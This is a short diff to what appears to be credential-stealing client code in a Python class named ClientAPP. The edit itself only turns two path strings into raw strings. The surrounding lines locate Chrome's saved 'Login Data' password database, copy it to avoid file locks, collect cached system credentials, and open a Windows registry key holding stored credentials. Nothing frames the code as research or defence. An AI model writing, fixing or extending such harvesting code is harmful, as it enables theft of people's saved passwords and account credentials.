@@ -1411,7 +1411,7 @@ class ClientAPP:
         
         # Chrome
         chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 
-                                'Google\\Chrome\\User Data\Default\\Login Data')
+                                r'Google\\Chrome\\User Data\Default\\Login Data')
         if os.path.exists(chrome_path):
             try:
                 # Copy database to temp file (avoid lock)
@@ -1463,7 +1463,7 @@ class ClientAPP:
             system_creds['cached'] = output.decode()
             
             # Get stored credentials
-            cred_path = "SOFTWARE\\Microsoft\Windows\\CurrentVersion\\Credentials"
+            cred_path = r"SOFTWARE\\Microsoft\Windows\\CurrentVersion\\Credentials"
             with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, cred_path) as key:
                 creds = []
                 try:
